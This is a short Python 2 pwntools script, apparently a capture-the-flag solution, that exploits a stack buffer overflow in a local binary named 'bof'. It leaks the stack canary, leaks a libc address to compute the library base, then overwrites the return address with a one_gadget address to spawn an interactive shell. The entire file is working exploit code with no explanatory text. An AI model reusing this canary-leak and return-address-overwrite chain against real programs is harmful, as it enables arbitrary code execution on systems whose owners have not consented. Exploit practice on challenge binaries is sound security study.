#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./bof')

r.recvuntil('> ')
r.sendline('1')
r.recvuntil('?\n> ')
r.sendline('2')
r.sendline('\x00' + 'b'* (0x44)) # leak canary

r.recvuntil('> ')
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('?\n> ')
r.sendline('2')

r.recvuntil('\n')
canary = u64('\x00' + r.recv(7))
print hex(canary)


r.recvuntil('> ')
r.sendline('1')
r.recvuntil('?\n> ')
r.sendline('2')
#r.sendline('\x00' + 'b'* (0x3f) + p64(canary) + p64(0xdeadbeef))
r.sendline('\x00' + 'b'* (0x3f) + 'a'*0x15)

r.recvuntil('> ')
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('?\n> ')
r.sendline('2')
r.recvuntil('\n')
libc_base = u64('\x00' + r.recv(5) + '\x00\x00') - 0x21b00
print hex(libc_base)

one_gadget = libc_base + 0x4f3c2


r.recvuntil('> ')
r.sendline('1')
r.recvuntil('?\n> ')
r.sendline('2')

raw_input('#')
r.sendline('\x00' + 'b'* (0x3f) + p64(canary) + p64(0xdeadbeef) + p64(one_gadget))

r.interactive()
